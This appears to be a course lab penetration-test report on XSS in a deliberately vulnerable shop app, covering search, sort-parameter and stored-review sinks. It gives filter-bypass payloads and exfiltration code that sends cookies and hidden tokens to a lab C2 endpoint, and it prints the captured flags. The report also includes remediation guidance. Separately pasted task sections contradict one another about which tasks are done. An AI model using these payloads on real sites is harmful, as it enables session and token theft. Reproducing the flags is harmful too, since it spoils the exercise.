# NexusShop XSS Assessment: Penetration Test Report

> **Reporting status:** Task 0 completed and verified. Tasks 1–7 have not been provided or assessed in this report and are marked as pending. This is a validated **Task 0 contribution** to the required eight-task final report, not a claim that all eight tasks have been tested.

## 1. Executive Summary

| Assessment attribute | Details |
|---|---|
| **Target** | `http://web0x0c.hbtn` (NexusShop) |
| **Assessment date** | 28 October 2026 |
| **Assessed scope** | Task 0, reflected XSS in the Basic, Filtered, and Advanced search endpoints; authorized lab C2 and tracking APIs |
| **Out-of-scope / not yet assessed** | Tasks 1–7; other application features and production infrastructure |
| **Overall result for Task 0** | **Vulnerable: High severity** |
| **Classification** | Reflected Cross-Site Scripting (XSS), **CWE-79** |

The NexusShop search feature reflects the `q` query parameter into a page heading as HTML without effective contextual output encoding. JavaScript execution was confirmed in **all three Task 0 stages**, including the stages that attempted to block `<script>` tags and common event handlers. Payloads issued successful HTTP requests to the designated lab C2 endpoint, and the Stage 3 tracking response returned the Task 0 flag. No actual session-cookie theft, credential harvesting, or keystroke capture was established by the available evidence; the confirmed impact is script execution and attacker-controlled data transmission from the application origin.

### Flags Captured

| Task | Flag | Vulnerability | Verification |
|---|---|---|---|
| **0** | `FLAG{5a492ce1de7b835a9e370f8a25a394cd}` | Reflected XSS in search (three stages) | Stage 3 `/search/api/track` returned HTTP `200` and JSON containing `"status":"tracked"` and this `ref` |
| 1–7 | **Not provided / not assessed** | Pending future task results | No flags claimed |

### Findings at a Glance

| Finding | Affected locations | Severity | Status |
|---|---|---|---|
| **NX-00: Reflected XSS through unsafely rendered search input** | `/search`, `/search/filtered`, `/search/advanced` | **High** | Confirmed in all three stages |

**Severity rationale:** A crafted search URL can cause script execution within the trusted NexusShop origin. This gives injected code access to the DOM, JavaScript-readable data, and same-origin browser requests under the victim's session. An actual account takeover was **not** demonstrated, so this report does not label the issue Critical or assert that a real session cookie was stolen.

## 2. Detailed Vulnerability Findings

## Task 0: Reflected XSS in Search

### Vulnerability Description

NexusShop embeds the user-controlled value of the `q` URL query parameter into the search-results heading. The observed DOM showed the input parsed as **HTML elements**, rather than rendered only as escaped text. As a result, a malicious search term can introduce executable browser markup into a page served from the NexusShop origin.

The Basic endpoint accepted direct `<script>` markup. The Filtered endpoint prevented the simplest script-tag technique but still accepted a JavaScript-bearing `onerror` attribute on an `<img>` element. The Advanced endpoint allowed an SVG animation element with an `onbegin` handler despite blocking more common event handlers. These are three manifestations of the **same underlying boundary failure**: untrusted query-string input was allowed to cross into an executable HTML/SVG context. The testing establishes the behavior of the response and DOM; the exact internal rendering function or template engine was not inspected.

**Source → sink → execution:**

```text
Untrusted search URL / user-submitted search text
             |
             v
HTTP query parameter: q
             |
             v
Search heading rendered as HTML: <h2>... USER_INPUT ...</h2>
             |
             v
Browser parses injected <script>, <img onerror>, or <svg><animate onbegin>
             |
             v
JavaScript executes in the http://web0x0c.hbtn origin
             |
             +--> POST /attacker/api/exfil  (designated lab C2)
             +--> Reads DOM tracking-id and GET /search/api/track?t=...
```

### Location & Parameters

| Attribute | Details |
|---|---|
| **Base URL** | `http://web0x0c.hbtn` |
| **Stage 1** | `GET /search?q=...` |
| **Stage 2** | `GET /search/filtered?q=...` |
| **Stage 3** | `GET /search/advanced?q=...&min_price=&max_price=` |
| **Source parameter** | `q` |
| **Other Stage 3 parameters** | `min_price`, `max_price` were present but were **not** established as injection points |
| **Observed sink** | Search heading (`<h2>`) containing reflected, HTML-interpreted user input |
| **Type** | Reflected XSS (server-reflected output observed; not stored XSS) |
| **Severity** | **High** |
| **CWE** | CWE-79, Improper Neutralization of Input During Web Page Generation |

### Objective

Verify whether the search term is reflected without effective HTML encoding; obtain browser-side JavaScript execution across progressively restricted filters; demonstrate a request to the designated C2 endpoint; and submit the lab's hidden tracking token.

### Attack Vector

1. Open `/search?q=TESTINPUT123`. The marker appears inside the search heading, confirming a reflection point.
2. Submit `<strong id="xss-probe">HTML_PROBE</strong>`. Firefox Inspector shows a real `<strong>` element inside the heading, confirming **HTML parsing** rather than escaped-text rendering.
3. On **Stage 1**, inject a `<script>` payload and observe `XSS_STAGE1_EXECUTED` in the browser Console.
4. On **Stage 2**, open `/search/filtered` and inject `<img src=x onerror=...>`. The failed image load generates an `error` event, and the Console shows `XSS_STAGE2_EXECUTED`. The correct filtered URL was checked independently, after an initial trial on the Basic route.
5. On **Stage 3**, open `/search/advanced` and inject SVG `<animate ... onbegin=...>`. The Console shows `XSS_STAGE3_EXECUTED`, demonstrating that an SVG-specific animation event bypassed the handler blacklist.
6. For each stage, run a stage-labelled payload that posts JSON to `POST /attacker/api/exfil`. The browser Network panel shows HTTP `200` responses and a success message from the lab collection endpoint.
7. After each page load, retrieve the hidden DOM element `#tracking-id` and submit its contents via `GET /search/api/track?t=...`. Stages 1 and 2 return `{"status":"tracked"}`; Stage 3 returns the same status **plus the flag**.

### Payload Used

The following payloads reproduce the relevant tests performed in the lab. The exfiltration destination is the **designated in-scope lab endpoint**, not a third-party service.

#### Stage 1: Basic search (`/search`)

**HTML parsing probe:**

```html
<strong id="xss-probe">HTML_PROBE</strong>
```

**JavaScript execution proof:**

```html
<script>console.log("XSS_STAGE1_EXECUTED")</script>
```

**Confirmed C2 request:**

```html
<script>
fetch("/attacker/api/exfil",{
  method:"POST",
  headers:{"Content-Type":"application/json"},
  body:JSON.stringify({
    type:"cookies",
    data:document.cookie||"no-readable-cookie",
    level:1,
    stage:1
  })
}).then(r=>console.log("EXFIL_STATUS:",r.status))
.catch(e=>console.error("EXFIL_ERROR:",e))
</script>
```

#### Stage 2: Filtered search (`/search/filtered`)

**JavaScript execution proof:**

```html
<img src=x onerror='console.log("XSS_STAGE2_EXECUTED")'>
```

**Confirmed C2 request:**

```html
<img src=x onerror='fetch("/attacker/api/exfil",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie||"no-readable-cookie",level:1,stage:2})}).then(r=>console.log("STAGE2_EXFIL_STATUS:",r.status)).catch(e=>console.error("STAGE2_EXFIL_ERROR:",e))'>
```

#### Stage 3: Advanced search (`/search/advanced`)

**JavaScript execution proof:**

```html
<svg><animate attributeName=x dur=1s onbegin='console.log("XSS_STAGE3_EXECUTED")'></animate></svg>
```

**Confirmed C2 request:**

```html
<svg><animate attributeName=x dur=1s onbegin='fetch("/attacker/api/exfil",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookies",data:document.cookie||"no-readable-cookie",level:1,stage:3})}).then(r=>console.log("STAGE3_EXFIL_STATUS:",r.status)).catch(e=>console.error("STAGE3_EXFIL_ERROR:",e))'></animate></svg>
```

#### Tracking API verification (run on the loaded stage page)

The tracking step was performed from the browser Console, after the DOM was available. It was a **separate manual verification step**, not proof that the injected payload automatically submitted the tracking token.

```javascript
(async () => {
  const token = document.getElementById("tracking-id")?.textContent.trim();
  console.log("TOKEN_FOUND:", Boolean(token));
  if (!token) return;

  const response = await fetch(
    "/search/api/track?t=" + encodeURIComponent(token)
  );
  console.log("TRACK_STATUS:", response.status);
  console.log("TRACK_RESPONSE:", await response.text());
})().catch(console.error);
```

The `encodeURIComponent` call above protects the **query-string structure** of this tracking request. It is not the fix for HTML injection in the search heading; that requires output encoding or safe text insertion.

### Evidence

All referenced screenshots are included in the companion `evidence/` directory, using paths relative to this Markdown file.

| ID | Stage | Observed result | Screenshot |
|---|---|---|---|
| E01 | 1 | `TESTINPUT123` reflected into `<h2>` | [Stage 1: reflected marker](evidence/task0-stage1-reflection.png) |
| E02 | 1 | Browser created `<strong id="xss-probe">` inside `<h2>` | [Stage 1: HTML parsing](evidence/task0-stage1-html-parsing.png) |
| E03 | 1 | Console printed `XSS_STAGE1_EXECUTED` | [Stage 1: JavaScript execution](evidence/task0-stage1-js-execution.png) |
| E04 | 1 | `POST /attacker/api/exfil` returned `200` and success JSON | [Stage 1: C2 request](evidence/task0-stage1-c2-network.png) |
| E05 | 1 | Lab dashboard displayed **1 Cookies-category record** | [Stage 1: C2 dashboard](evidence/task0-stage1-c2-dashboard.png) |
| E06 | 1 | `GET /search/api/track` returned `200`, `{"status":"tracked"}` | [Stage 1: tracking](evidence/task0-stage1-tracking.png) |
| E07 | 2 | Correct `/search/filtered` route, DOM `onerror`, Console marker | [Stage 2: filter bypass](evidence/task0-stage2-js-execution.png) |
| E08 | 2 | Stage-labelled C2 POST returned `200`; submitted data was **`no-readable-cookie`** | [Stage 2: C2 request](evidence/task0-stage2-c2-network.png) |
| E09 | 2 | Token found; tracking returned `200`, `{"status":"tracked"}` | [Stage 2: tracking](evidence/task0-stage2-tracking.png) |
| E10 | 3 | Correct `/search/advanced` route, SVG `onbegin` in DOM, Console marker | [Stage 3: SVG bypass](evidence/task0-stage3-js-execution.png) |
| E11 | 3 | Stage-labelled C2 POST returned `200` with success JSON | [Stage 3: C2 request](evidence/task0-stage3-c2-network.png) |
| E12 | 3 | Tracking returned `200` and the flag in JSON field `ref` | [Stage 3: flag response](evidence/task0-stage3-flag.png) |

**Key response excerpts:**

```text
Stage 1: EXFIL_STATUS: 200
Stage 1: TRACK_RESPONSE: {"status":"tracked"}
Stage 2: STAGE2_EXFIL_STATUS: 200
Stage 2: Request JSON included "data":"no-readable-cookie"
Stage 2: STAGE2_TRACK_RESPONSE: {"status":"tracked"}
Stage 3: STAGE3_EXFIL_STATUS: 200
Stage 3: STAGE3_TRACK_STATUS: 200
Stage 3: STAGE3_TRACK_RESPONSE:
{"ref":"FLAG{5a492ce1de7b835a9e370f8a25a394cd}","status":"tracked"}
```

**Evidence limitation:** The C2 endpoint's success response confirms receipt of the submitted JSON. Stage 2 explicitly sent the fallback string `no-readable-cookie`; the shown Stage 1 and Stage 3 responses do not establish the contents of any real browser cookie. There is no documented theft of a usable session token or credentials, nor any documented keylogging. The code nonetheless shows that an attacker-controlled script can read any **non-HttpOnly** cookies available to that document.

**Example inline evidence images:**

![Stage 2: filtered XSS executes JavaScript](evidence/task0-stage2-js-execution.png)

![Stage 3: successful tracking response includes the flag](evidence/task0-stage3-flag.png)

### Real-World Impact

A malicious actor could place an encoded HTML/JavaScript payload in the `q` parameter and distribute a link bearing the legitimate NexusShop domain. If a victim follows that link, the injected JavaScript executes in the application's origin. Depending on the user's privileges and browser/application defenses, it could:

- Read JavaScript-accessible page contents, including exposed user data, hidden DOM tokens, and **non-HttpOnly** cookies.
- Send same-origin requests as the active user and potentially perform unauthorized account actions if application endpoints lack other protections.
- Replace page elements with a convincing login or payment prompt, creating a credential-phishing opportunity.
- Monitor form interactions or keystrokes while the injected page is open, if an attacker supplies additional code.
- Send accessible data to a collection endpoint, as demonstrated here with the authorized lab C2 API.

These are **plausible consequences**, not additional impacts claimed as tested. A successful `POST` containing `no-readable-cookie` is not evidence that a session cookie was stolen. `HttpOnly` prevents `document.cookie` access to protected cookies, but it does not by itself prevent injected code from making browser requests in the victim's session.

### Remediation

1. **Fix the search-heading sink (primary fix).** Render the search term as text instead of HTML. In browser-side code, prefer `heading.textContent = 'Showing results for: ' + query` over `heading.innerHTML = ...`. In a server-side Jinja2 template, use autoescaped `{{ q }}` in an HTML text context; never opt out with `{{ q | safe }}`. The implementation was not inspected, so these are framework-specific **examples**, not claims about NexusShop's stack.
2. **Apply context-appropriate output encoding.** Escape at least `&`, `<`, `>`, `"`, and `'` as appropriate for the insertion context. HTML body, attribute, JavaScript, CSS, and URL contexts have different encoding rules. Percent-encoding a URL parameter alone does **not** prevent XSS when its decoded value is later inserted as HTML.
3. **Avoid denylist filters.** Blocking only `<script>`, `onerror`, and `onload` leaves other executable constructs, including SVG event attributes such as `onbegin`. If a product requirement truly needs user-supplied HTML, sanitize it with a maintained allowlist-based HTML sanitizer and exclude executable attributes and SVG/MathML constructs unless specifically necessary.
4. **Add defense-in-depth Content Security Policy.** Deploy a restrictive `script-src` policy using per-response nonces or hashes for approved scripts, without `unsafe-inline`; assess and restrict permitted destinations with `connect-src`. Validate the policy in report-only mode first and then enforce it. CSP reduces exploitability but does not replace safe HTML rendering.
5. **Strengthen session and data protections.** Use `HttpOnly`, `Secure` (under HTTPS), and appropriate `SameSite` flags for session cookies. Avoid storing secrets in script-readable DOM/JavaScript where unnecessary; enforce authorization and CSRF defenses on state-changing endpoints.
6. **Regression-test each route.** Automated tests should submit harmless representatives of direct scripts, broken-image handlers, and SVG animation handlers into `/search`, `/search/filtered`, and `/search/advanced`; then assert that no element/event handler is created and that user input appears only as text.
7. **Verify the fix in the browser.** Confirm `<strong id="xss-probe">HTML_PROBE</strong>` appears literally in the heading, rather than becoming a DOM node; confirm the three JavaScript proof markers do **not** print. Review actual response HTML, the live DOM, and CSP violations.

---

### Tasks 1–7: Pending Findings

The final course deliverable requires documentation for **Tasks 0–7**. Only Task 0 exploitation evidence and its flag have been supplied for this report. The following entries are intentionally unfilled, to avoid attributing untested vulnerabilities or fabricated flags to NexusShop. For each subsequent task, replace the placeholder with the same fields used above: *Vulnerability Description, Location & Parameters, Objective, Attack Vector, Payload Used, Evidence, Real-World Impact, and Remediation*.

| Task | Vulnerability description | Location / parameters | Attack vector and payload | Evidence / C2 | Impact | Remediation | Flag |
|---|---|---|---|---|---|---|---|
| **1** | Not assessed | Pending | Pending | Pending | Pending | Pending | Not captured in supplied evidence |
| **2** | Not assessed | Pending | Pending | Pending | Pending | Pending | Not captured in supplied evidence |
| **3** | Not assessed | Pending | Pending | Pending | Pending | Pending | Not captured in supplied evidence |
| **4** | Not assessed | Pending | Pending | Pending | Pending | Pending | Not captured in supplied evidence |
| **5** | Not assessed | Pending | Pending | Pending | Pending | Pending | Not captured in supplied evidence |
| **6** | Not assessed | Pending | Pending | Pending | Pending | Pending | Not captured in supplied evidence |
| **7** | Not assessed | Pending | Pending | Pending | Pending | Pending | Not captured in supplied evidence |

## 3. Remediation Summary

| Priority | Recommendation | Applies to | Rationale |
|---|---|---|---|
| **P0 - Immediate** | Treat `q` as text in the search heading; enable contextual autoescaping and remove any unsafe HTML rendering | All three search routes | Eliminates the demonstrated source-to-sink execution path |
| **P0 - Immediate** | Stop relying on tag or event-handler blacklists as the XSS control | Filtered and Advanced routes | SVG `onbegin` and `<img onerror>` bypass incomplete denylists |
| **P1 - High** | Implement a restrictive, enforced CSP with nonce/hash-based scripts and restricted `connect-src` | Application-wide | Adds a second line of defense and limits outbound connections |
| **P1 - High** | Harden session cookies with `HttpOnly`, `Secure`, and suitable `SameSite` | Authentication/session handling | Limits cookie exposure and some cross-site request risks; does not cure XSS |
| **P1 - High** | Enforce server-side authorization and CSRF protections for sensitive operations | Authenticated endpoints | Prevents some unauthorized actions even if browser content is compromised |
| **P2 - Medium** | Add automated XSS regression tests for the three observed classes of payload | CI/CD pipeline | Detects future regressions in HTML, event-handler, and SVG contexts |
| **P2 - Medium** | Adopt a vetted HTML sanitizer only for features that genuinely require rich HTML | Any future rich-text input | Safely constrains allowed tags/attributes instead of guessing bad strings |

**Recommended acceptance criteria:** Across all three routes, the `q` value must be visible as inert text; injected tags and event handlers must not become executable DOM; regression tests must pass; and a browser retest must confirm no XSS proof marker or C2 request is triggered by the test payloads.

## 4. Conclusion

**Assessment status:** Task 0 is **completed**, and its reflected XSS vulnerability is **confirmed and not remediated in the assessed lab**. Script execution, successful requests to the in-scope C2 API, and token tracking were observed across Basic, Filtered, and Advanced search stages. The Stage 3 tracking response yielded the exact Task 0 flag, which was submitted to the repository according to the assessment record.

The application is an **intentionally vulnerable educational lab**. The exercise demonstrates why reflected input must be encoded for its eventual output context, why blocking a short list of dangerous tags and event handlers does not solve XSS, and why impact reporting must distinguish confirmed data transfer from unproven cookie theft or account compromise.

**Final submission note:** This Markdown file is complete **for Task 0**. It will not satisfy the course's complete Tasks 0–7 requirement until evidence-backed findings for Tasks 1–7 are added. Keep `SECURITY_REPORT.md` beside the included `evidence/` folder under `web_application_security/websec_0x0C/` so the relative screenshot links resolve.





# Task 1 - Penetration Test Report — Reflected XSS in JavaScript Context (NexusShop)

| Field | Value |
|-------|-------|
| **Target** | NexusShop (`http://web0x0c.hbtn`) |
| **Component** | Product sort endpoint (`/products/sort`, `/dynamic`, `/advanced`) |
| **Vulnerability class** | CWE-79 — Improper Neutralization of Input During Web Page Generation (Cross-Site Scripting) |
| **Tester** | Penetration test (authorized lab engagement) |
| **Flag captured** | `FLAG{b4797b8faa98c8b5fca7634fab070de7}` |

---

## Executive Summary

The NexusShop product-sorting feature reflects the user-controlled `by` parameter directly into an inline `<script>` block, inside a single-quoted JavaScript string (`var currentSort = '<INPUT>';`). Because the value lands in a **JavaScript-string context** rather than an HTML context, the application's HTML-oriented defenses (encoding `<`, `>`) do not neutralize it. An attacker who controls `by` can break out of the string and execute arbitrary JavaScript in the victim's session.

Three stages of the same endpoint demonstrate increasingly strict input filtering, illustrating the central lesson: **output encoding must match the context the data lands in.** Encoding appropriate for HTML (entity-encoding angle brackets) provides no protection for a value placed inside a JavaScript string, where the significant character is the string delimiter, not the angle bracket.

Impact was demonstrated by exfiltrating the per-session `tracking-id` token to the application's own tracking endpoint (`/products/sort/api/track`), which the server validates and, on success, releases the flag — modelling theft of a session-bound secret via XSS.

**Business impact:** session/credential theft, account takeover, fraudulent transactions on behalf of victims, and reputational damage. Severity: **High** (reflected XSS requiring victim interaction, but no authentication needed to craft the payload and the sink executes in authenticated context).

---

## Stage 1: Reflected XSS — JavaScript String Context (Stage 1 "Standard")

### Vulnerability Description

The `by` parameter is reflected, without context-appropriate encoding, directly inside a single-quoted JavaScript string literal within an inline `<script>` element. The developer applies HTML entity encoding to `<`, `>`, `'` and `"`, which is the correct defense for an **HTML** context but is ineffective reasoning about the actual sink. The vulnerability exists because the application chose an encoding scheme based on where it *assumed* the data would appear (HTML body) rather than where it *actually* appears (a JavaScript string).

Why it exists: the data flows from an HTTP GET parameter straight into server-rendered inline script. No JavaScript-string escaping (e.g. `\x27` for quotes, `\n` for newlines) is applied, and no Content-Security-Policy is present to contain inline execution.

### Location & Parameters
| Attribute | Details |
|-----------|---------|
| **URL** | `/products/sort?by=` |
| **Parameter/Field** | `by` |
| **Type** | Reflected XSS (JavaScript-string context) |
| **Severity** | High |

### Attack Vector

1. Visit `/products/sort?by=TESTINPUT123` and locate the marker in the inline script: `var currentSort = 'TESTINPUT123';`.
2. Identify the surrounding syntax: the value is inside a **single-quoted** JS string; the characters immediately after are `';`.
3. Close the string with `'`, inject a statement, and comment out the original trailing `';` with `//`.
4. Confirm execution in the Console; replace the harmless test with an exfiltration payload targeting the `tracking-id` token.

### Payload Used

```
';fetch('/products/sort/api/track?t='+document.getElementById('tracking-id').innerText);//
```

Resulting rendered script:

```javascript
var currentSort = '';fetch('/products/sort/api/track?t='+document.getElementById('tracking-id').innerText);//';
```

> Note: In this lab build, Stage 1's filter was observed to HTML-entity-encode the quote (`'` → `&#39;`), so this canonical pattern illustrates the intended technique for an unfiltered JS-string sink. Stage 1 and Stage 2 are preparatory (they populate the C2 loot feed); the flag is awarded at Stage 3 (see Task 3).

### Evidence

- DevTools → Sources shows the injected payload inside the `<script>` block.
- Console: no syntax errors; the injected statement executes.
- Network: a `GET /products/sort/api/track?t=<token>` request is issued by the injected code.

### Real-World Impact

Arbitrary JavaScript execution in the victim's authenticated session: theft of session tokens and cookies, silent requests performed as the victim (CSRF-style actions), credential harvesting via injected fake login forms, and keylogging.

### Remediation

- Apply **JavaScript-string output encoding** to any value placed inside a script string (escape `'`, `"`, `\`, `/`, newlines, and `<`/`>` as `\xHH` / `\uXXXX`), not HTML entity encoding.
- Preferably, do **not** reflect user input into inline scripts at all; pass data via `JSON.parse(...)` of a server-serialized, properly escaped JSON string, or via a `data-` attribute read with `.dataset`.
- Deploy a Content-Security-Policy with nonces and without `unsafe-inline` to contain any residual injection.

---

## Stage 2: Reflected XSS — Quote-Stripping Filter (Stage 2 "Dynamic")

### Vulnerability Description

The `/dynamic` variant reflects `by` into the same JavaScript-string sink but applies a filter that **strips quote characters** (`'` removed entirely) rather than encoding them. Stripping is a blocklist-style defense and is weaker than context-aware encoding: it attempts to remove "dangerous" characters instead of safely representing them. This stage demonstrates why relying on character removal is fragile — the surrounding code structure (a developer-authored opening and closing quote) can still be manipulated with characters the filter ignores (backslash, newline), and the defense can be defeated where a second evaluation or a re-parse sink exists.

### Location & Parameters
| Attribute | Details |
|-----------|---------|
| **URL** | `/products/sort/dynamic?by=` |
| **Parameter/Field** | `by` (note: `sort` / `order` do **not** reach the vulnerable variable) |
| **Type** | Reflected XSS (JavaScript-string context, quote-stripping filter) |
| **Severity** | High |

### Attack Vector

1. Visit `/products/sort/dynamic?by=TESTINPUT123` and confirm reflection into `var currentSort = '...'`.
2. Observe that literal `'` characters are stripped from the output (`';x` → `;x`).
3. Study filter-evasion options that avoid a literal quote: backslash manipulation (`\`), newline injection (`%0A`), and Unicode/hex escapes (`\u0027`, `\x27`).
4. Confirm execution in the Console and the exfiltration request in the Network tab.

### Payload Used

```
;fetch(`/products/sort/api/track?t=${document.getElementById(`tracking-id`).innerText}`)//
```

> Uses **backtick template literals** instead of `'`/`"` so the payload contains no character the quote-stripper removes. The backtick survives the filter; `${...}` interpolates the token into the URL.

### Evidence

- Sources shows the stripped value and the surviving backtick-based payload.
- Console: parser errors during probing confirm the string boundary is being manipulated ("you are close"); a clean run fires the request.
- C2 loot feed (`/attacker`) records the exfiltration.

### Real-World Impact
Identical to Stage 1. Additionally demonstrates that **input filtering by character removal is insufficient** — attackers substitute equivalent representations (template literals, escape sequences) the blocklist did not anticipate.

### Remediation

- Replace character stripping with **context-aware output encoding** (JS-string escaping).
- Do not reflect input into inline scripts; serialize via safe JSON.
- Add CSP (nonce-based, no `unsafe-inline`).

---

## Stage 3: Reflected XSS — Strict Filter & Token Exfiltration (Stage 3 "Advanced") — FLAG

### Vulnerability Description

The `/advanced` variant applies the strictest filter: it HTML-encodes raw `<` and `>`, and strips `'`, `"`, `(` and `)`. User input is reflected in two `href="..."` attributes (as URL text) and in the inline-script `var currentSort` string. Despite the strict filter, the application still exposes a per-session secret — the `tracking-id` token in a hidden `<div>` — and an endpoint (`/products/sort/api/track`) that validates and records that token. The core flaw remains CWE-79: untrusted input reaches a script context, and sensitive session-bound data is readable by any script executing on the page.

The flag is released by the server when the valid, current `tracking-id` is submitted to the tracking endpoint within the same session — modelling the end-to-end impact of XSS: read a session secret, exfiltrate it, and have the server confirm the compromise.

### Location & Parameters
| Attribute | Details |
|-----------|---------|
| **URL** | `/products/sort/advanced?by=` and `/products/sort/api/track?t=` |
| **Parameter/Field** | `by`, `t` |
| **Type** | Reflected XSS (strict filter) + session-token exfiltration |
| **Severity** | High / Critical |

### Attack Vector

1. Visit `/products/sort/advanced?by=TESTINPUT123` and map all reflections (two `href` attributes + inline-script string).
2. Characterize the filter: raw `<`/`>` → `&lt;`/`&gt;`; `'`, `"`, `(`, `)` stripped; backticks, `${}`, `[]`, `.`, `+`, `=` survive; fullwidth `＜`/`＞` (U+FF1C/U+FF1E) pass the filter and normalize toward `<`/`>` in some sinks (Unicode-normalization evasion).
3. Read the session-bound `tracking-id` from the hidden `<div id="tracking-id">` (via DevTools, or `curl` with the session cookie).
4. Submit the token to the tracking endpoint to demonstrate exfiltration and capture the flag.

### Payload Used

Token-exfiltration intent (parens-free / quote-free, using tagged templates):

```
fetch`/products/sort/api/track?t=${document.all[`tracking-id`].innerText}`
```

Equivalent command-line proof (same-session token read + submission):

```bash
COOKIE='session=<YOUR_SESSION_COOKIE>'
TID=$(curl -s 'http://web0x0c.hbtn/products/sort/advanced?by=name' -H "Cookie: $COOKIE" \
      | grep -oP '(?<=id="tracking-id"[^>]*>)[^<]+')
curl -s "http://web0x0c.hbtn/products/sort/api/track?t=$TID" -H "Cookie: $COOKIE"
```

### Evidence

Server response confirming capture:

```json
{"ref":"FLAG{b4797b8faa98c8b5fca7634fab070de7}","status":"tracked"}
```

- Hidden token observed in DOM: `<div id="tracking-id" style="display:none">_N-JTXcFEOIkby45C19ukQ</div>`.
- Session cookie contains the server-side scoreboard: decoded payload `{"flags":[...],"level_3_stage":3,"session_id":"..."}`.
- No `Content-Security-Policy` response header present — inline execution is unrestricted.

### Real-World Impact

An attacker can steal session-bound secrets (CSRF tokens, session identifiers, tracking tokens) even against a filter that blocks the common breakout characters, by (a) exploiting context mismatches and alternate character representations, and (b) reading secrets the page itself exposes to script. Consequences include full session hijacking, account takeover, and fraudulent actions. The absence of CSP means a single successful injection yields unrestricted script execution.

### Remediation

- **Context-aware output encoding** everywhere the value is reflected: JS-string escaping in the script sink; URL-encoding plus attribute-encoding in `href` values.
- **Normalize then validate**: apply Unicode normalization (NFKC) *before* filtering so look-alike characters (fullwidth `＜`) cannot bypass checks; prefer allowlist validation (`by` ∈ {name, price, rating}) over blocklist stripping.
- **Stop exposing session secrets to the DOM**: the `tracking-id` should be an `HttpOnly` cookie or server-side state, never readable JavaScript text.
- **Deploy CSP** with per-response nonces and no `unsafe-inline`; this alone would have prevented the injected inline execution.
- Bind tokens to additional server-side checks (origin, referer, short expiry) to limit replay.

---

## Root-Cause Summary

| Principle | Why it matters here |
|-----------|---------------------|
| Output encoding is **context-sensitive** | Encoding `<`/`>` protects HTML, not JS strings; the delimiter (`'`) is what matters in a string sink. |
| Input validation ≠ output encoding | Stripping/encoding at input (Stages 2–3) failed; encoding must happen at the **output** sink, matched to its grammar. |
| Blocklists are fragile | Character removal was bypassed via template literals, escapes, and Unicode normalization. Allowlists are robust. |
| Defense in depth | No CSP meant one injection = full execution. CSP with nonces contains residual bugs. |
| Don't expose secrets to script | A session token in a readable DOM node is exfiltratable by any XSS. |


## Task 2: Stored XSS — Product Reviews (Username Field)

### Vulnerability Description

NexusShop's product review feature persists user-submitted reviews and renders them back to every visitor of the product page without context-appropriate output encoding. Across the three stages, the review **body** is progressively protected (unfiltered → `<script>` stripped), but the review **author name** field remains unsanitized in its text-content reflection — the classic "forgotten field." Because the stored value is rendered with a `|safe`-style raw output, any HTML an attacker submits becomes live DOM, and an element with an auto-firing event handler (`<img onerror>`) executes JavaScript in the browser of **every** user who loads the page, with no interaction required.

This is a **stored (persistent)** XSS: the payload is injected once into the server's database and executes repeatedly for all subsequent viewers until the data is cleaned. It exists because the application trusts the stored content at render time — treating input validation at submission as a substitute for output encoding at display — and because the developer sanitized the obvious `review` field while overlooking the `name` field, which is reflected both inside a `title="..."` attribute (safely encoded) and as the author's display text (unencoded).

### Location & Parameters
| Attribute | Details |
|-----------|---------|
| **URL** | `/product/1/reviews` (Stage 1), `/product/1/reviews/verified` (Stage 2), `/product/1/reviews/all` (Stage 3 — flag) |
| **Parameter/Field** | `name` (author) — primary sink for Stage 3; `review` (body) for Stages 1–2 |
| **Type** | Stored / Persistent XSS |
| **Severity** | Critical |

### Attack Vector

1. Submit a benign review and locate where each field reflects. The `review` body renders in `<div class="text-zinc-300">…</div>`; the `name` renders as `<span class="font-medium" title="NAME">NAME</span>` — reflected in both an attribute and as text.
2. Prove HTML injection: a `<b>` tag in the body renders bold → raw HTML sink confirmed (Stage 1, unfiltered).
3. Escalate to automatic JS execution with an auto-firing element: `<img src=x onerror=…>` fires on load without user interaction. Stage 2 strips `<script>` but leaves event handlers untouched, so `<img onerror>` still executes.
4. Stage 3: the body is locked down, so pivot to the **`name`** field (the hint: "the review form has more than one field"). The `name` text-content reflection executes raw HTML.
5. Defeat the attribute-context constraints in `name`: avoid spaces (use `/` as attribute separators), avoid `>` inside the handler (use `function(){}` not `()=>`), and avoid `'`/`"` (use backticks) so the payload survives both the `title="…"` quoting and HTML tag parsing.
6. Load the C2 toolkit and call the full-compromise function, pointing it at the **reviews-feature** callback path with the **session-correct** level/stage, to exfiltrate data and capture the flag.

### Payload Used

Stored in the **name** field (review body irrelevant):

```html
<img/src/onerror=import(`/attacker/toolkit.js`).then(function(){XSS.pwn(4,3,`/product/reviews/api/track`)})>
```

Filter-evasion notes:
- `<img/src/onerror=…>` — forward slashes act as attribute separators, so the payload contains **no spaces** (spaces would split the value into bogus HTML attributes).
- `function(){…}` instead of an arrow function — avoids `>`, which the HTML parser would read as the end of the `<img>` tag and truncate the handler.
- Backticks for all strings — avoid `'`/`"`, which would collide with the surrounding `title="…"` attribute quoting.
- `import()` dynamically loads the toolkit as a module, then `.then(...)` runs `pwn` after it is available.

Key parameters (discovered, not assumed):
- **callbackPath `/product/reviews/api/track`** — found by probing: a wrong path returns HTTP 404, whereas the correct endpoint returns `{"status":"error"}` until supplied the valid live token. (Reusing Task 1's `/products/sort/api/track` always failed — the track endpoint is feature-specific.)
- **level 4, stage 3** — taken from the server-side scoreboard in the session cookie (`"level_4_stage":3`), not from the exercise number. The server validates against the session's actual level.

### Evidence

- C2 Live Loot Feed recorded a `tokens` capture tagged **Level 4 / Stage 3** with a non-empty tracking value, e.g. `{"tracking":"Q5cAmWf8EwcDPztUmlYIJg","localStorage":"{}","sessionStorage":"{}"}` — demonstrating that the stored payload exfiltrated per-visitor data to the attacker-controlled C2.
- The toolkit's `pwn()` also issued the flag-capture callback, and the server returned:

```json
{"ref":"FLAG{3813fad2d10b442e2fd23a089f3419fb}","status":"tracked"}
```

- Persistence verified: the payload fired automatically on a clean page reload (no re-injection), confirming it is stored server-side and affects every visitor.
- Screenshot: `XSS_Task2_Stage3_Flag_ok.png` (network response showing `status: tracked` and the flag).

### Real-World Impact

Stored XSS on a high-traffic product page is among the most damaging web vulnerabilities. A single injected review would execute in the browser of **every** customer who views that product — potentially millions of executions — with no victim action required. An attacker could:

- Steal session cookies and authentication tokens, enabling mass account takeover (note: in this lab the session cookie was `HttpOnly`, which blocked `document.cookie` theft — a reminder that `HttpOnly` is an effective layer, though it does not stop other exfiltration such as tokens rendered into the DOM).
- Harvest credentials by injecting a convincing fake "session expired" login overlay on the trusted domain.
